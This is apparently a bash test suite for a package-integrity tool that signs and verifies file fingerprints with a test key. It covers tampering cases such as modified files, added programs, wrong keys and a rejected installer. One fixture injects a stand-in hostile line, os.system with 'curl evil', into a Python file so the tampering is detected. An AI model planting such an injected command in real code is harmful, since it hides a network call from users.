#!/usr/bin/env bash
# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (C) 2026 Daniele Deplano (RedRider21). Parte di Nyctalus Protocol.
# AUTOCONTROLLO D'INTEGRITÀ: il pacchetto porta INTEGRITA (impronta di ogni file) firmato con la
# chiave della release; nyctalus-integrita lo verifica. Qui con una chiave DI PROVA (mai quella
# vera): pacchetto intatto ✓; un file cambiato, un programma aggiunto, una firma d'altri o un
# elenco ritoccato ✗; la mappa del motore del telefono funziona ma non fa passare un file falso;
# l'installatore del PC rifiuta un pacchetto alterato e copia l'elenco firmato nell'installazione.
. "$(dirname "$0")/../lib.sh"
titolo "Sicurezza · autocontrollo d'integrità dei programmi installati"
command -v ssh-keygen >/dev/null || { salta "ssh-keygen non installato"; exit 0; }
INT="$ROOT/pc/cli/nyctalus-integrita"
ssh-keygen -q -t ed25519 -N "" -C prova -f "$TMP/chiave" >/dev/null
export NYCTALUS_CHIAVE_RELEASE="$TMP/chiave" NYCTALUS_FIRMA_INTEGRITA="$(cut -d' ' -f1,2 "$TMP/chiave.pub")"
P="$TMP/pacchetto"; mkdir -p "$P/bin/aarch64-linux-android" "$P/bin/x86_64-linux-android" "$P/cli" "$P/chat"
head -c 200000 /dev/urandom > "$P/bin/aarch64-linux-android/nyctalus"; head -c 210000 /dev/urandom > "$P/bin/x86_64-linux-android/nyctalus"
echo 'print("ciao")' > "$P/chat/app.py"; printf '#!/bin/sh\necho cli\n' > "$P/cli/nyctalus-cli"; chmod +x "$P/cli/nyctalus-cli"
python3 "$INT" firma "$P" > /dev/null
[ -s "$P/INTEGRITA" ] && [ -s "$P/INTEGRITA.sig" ] && [ "$(wc -l < "$P/INTEGRITA")" -eq 4 ] && pass "firma: elenco di 4 file con le impronte e la firma" || fail "firma non creata"
verifica() { NO_COLOR=1 python3 "$INT" verifica "$1" > "$TMP/v.txt" 2>&1; }
verifica "$P" && grep -q "4 file identici" "$TMP/v.txt" && grep -q "INTEGRITÀ CONFERMATA" "$TMP/v.txt" && pass "pacchetto intatto: integrità confermata" || fail "intatto: $(cat "$TMP/v.txt")"

cp -r "$P" "$TMP/a"; echo 'import os; os.system("curl evil")' >> "$TMP/a/chat/app.py"
! verifica "$TMP/a" && grep -q "MODIFICATO: chat/app.py" "$TMP/v.txt" && pass "un file cambiato: indicato per nome, esito ✗" || fail "file cambiato non visto"
cp -r "$P" "$TMP/b"; echo 'x' > "$TMP/b/chat/spia.py"; echo 'note' > "$TMP/b/chat/note.txt"
! verifica "$TMP/b" && grep -q "aggiunto: chat/spia.py" "$TMP/v.txt" && ! grep -q "note.txt" "$TMP/v.txt" && pass "un programma aggiunto: ✗ (un testo qualsiasi invece no)" || fail "aggiunta: $(cat "$TMP/v.txt")"
cp -r "$P" "$TMP/c"; sed -i '1s/^./0/' "$TMP/c/INTEGRITA"
! verifica "$TMP/c" && grep -q "firma dell'elenco" "$TMP/v.txt" && pass "elenco ritoccato (impronta cambiata a mano): la firma non torna, ✗" || fail "elenco ritoccato accettato"
cp -r "$P" "$TMP/d"; ssh-keygen -q -t ed25519 -N "" -f "$TMP/altra" >/dev/null
NYCTALUS_CHIAVE_RELEASE="$TMP/altra" python3 "$INT" firma "$TMP/d" > /dev/null
! verifica "$TMP/d" && pass "pacchetto firmato da un'altra chiave: rifiutato" || fail "altra chiave accettata"
cp -r "$P" "$TMP/e"; rm "$TMP/e/INTEGRITA.sig"
! verifica "$TMP/e" && grep -q "manca INTEGRITA" "$TMP/v.txt" && pass "firma assente: non si dichiara integro" || fail "senza firma: $(cat "$TMP/v.txt")"
( unset NYCTALUS_FIRMA_INTEGRITA; ! NO_COLOR=1 python3 "$INT" verifica "$P" > /dev/null 2>&1 ) && pass "con la chiave VERA della release un pacchetto firmato con la chiave di prova non passa" || fail "chiave di prova accettata come vera"

# installazione come quella del telefono: un motore copiato con un altro nome + mappa
I="$TMP/inst"; mkdir -p "$I/bin" "$I/chat" "$I/cli"
cp "$P/INTEGRITA" "$P/INTEGRITA.sig" "$I/"; cp "$P/chat/app.py" "$I/chat/"; cp -p "$P/cli/nyctalus-cli" "$I/cli/"
cp "$P/bin/aarch64-linux-android/nyctalus" "$I/bin/nyctalus"; printf 'bin/nyctalus\tbin/aarch64-linux-android/nyctalus\n' > "$I/INTEGRITA.mappa"
verifica "$I" && grep -q "3 file identici" "$TMP/v.txt" && pass "installazione del telefono: il motore copiato come bin/nyctalus si riconosce dalla mappa" || fail "mappa: $(cat "$TMP/v.txt")"
head -c 200000 /dev/urandom > "$I/bin/nyctalus"
! verifica "$I" && grep -q "MODIFICATO: bin/nyctalus" "$TMP/v.txt" && pass "motore sostituito: la mappa non lo fa passare" || fail "motore falso accettato con la mappa"

# installatore del PC: un pacchetto alterato non si installa; quello intatto porta con sé l'elenco
{
  Q="$TMP/pc"; mkdir -p "$Q"
  cp "$ROOT/pc/installa.sh" "$Q/"; mkdir -p "$Q/cli" "$Q/bin"; cp "$INT" "$Q/cli/"
  printf '#!/bin/sh\nexit 0\n' > "$Q/bin/nyctalus"; chmod +x "$Q/bin/nyctalus"
  python3 "$INT" firma "$Q" > /dev/null
  ( cd "$Q" && HOME="$TMP/casa0" XDG_DATA_HOME="$TMP/casa0/dati" NYCTALUS_SOLO_VERIFICA=1 bash ./installa.sh > "$TMP/inst0.log" 2>&1 ) \
    && grep -q "Integrità del pacchetto confermata" "$TMP/inst0.log" && pass "installatore del PC: pacchetto intatto, integrità confermata" || fail "installatore, pacchetto intatto: $(tail -3 "$TMP/inst0.log")"
  echo "# alterato" >> "$Q/cli/nyctalus-integrita"
  H="$TMP/casa"; mkdir -p "$H"
  ( cd "$Q" && HOME="$H" XDG_DATA_HOME="$H/dati" NYCTALUS_SOLO_VERIFICA=1 bash ./installa.sh > "$TMP/inst.log" 2>&1 ); E=$?
  [ "$E" -ne 0 ] && grep -q "integrità" "$TMP/inst.log" && [ ! -d "$H/dati/nyctalus/cli" ] && pass "installatore del PC: pacchetto alterato RIFIUTATO, nulla installato" || fail "installatore: codice $E · $(tail -3 "$TMP/inst.log")"
}
[ "$KO" -eq 0 ]
